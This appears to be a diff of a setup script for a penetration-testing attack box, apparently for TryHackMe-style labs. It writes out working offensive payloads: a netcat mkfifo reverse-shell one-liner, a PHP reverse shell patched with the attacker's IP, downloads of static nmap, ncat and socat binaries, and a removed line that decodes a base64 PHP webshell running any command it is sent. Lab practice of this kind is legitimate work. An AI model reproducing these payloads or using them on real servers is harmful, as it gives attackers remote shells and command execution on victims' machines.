@@ -26,9 +26,6 @@ echo "static binary download scripts"
 echo "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap && wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat && wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" > get-static-binaries.sh
 chmod +x get-static-binaries.sh
 
-echo "simple php webshell.php"
-echo PGZvcm0gbWV0aG9kPSJHRVQiIG5hbWU9Ijw/cGhwIGVjaG8gYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOyA/PiI+CjxpbnB1dCB0eXBlPSJURVhUIiBuYW1lPSJjbWQiIGlkPSJjbWQiIHNpemU9IjgwIj4KPGlucHV0IHR5cGU9IlNVQk1JVCIgdmFsdWU9IkV4ZWN1dGUiPgo8L2Zvcm0+CjxwcmU+Cjw/cGhwCiAgICBpZihpc3NldCgkX0dFVFsnY21kJ10pKQogICAgewogICAgICAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOwogICAgfQo/Pgo8L3ByZT4KPHNjcmlwdD5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY21kIikuZm9jdXMoKTs8L3NjcmlwdD4K | base64 -d > webshell.php
-
 echo "useful payloads"
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(hostname -i) 4444 >/tmp/f" > nc-rev.txt
 cp /usr/share/webshells/php/php-reverse-shell.php ./reverse.php && sed -i "s/PUT_THM_ATTACKBOX_IP_HERE/$(hostname -i)/g" reverse.php && sed -i "s/1234/4444/g" reverse.php
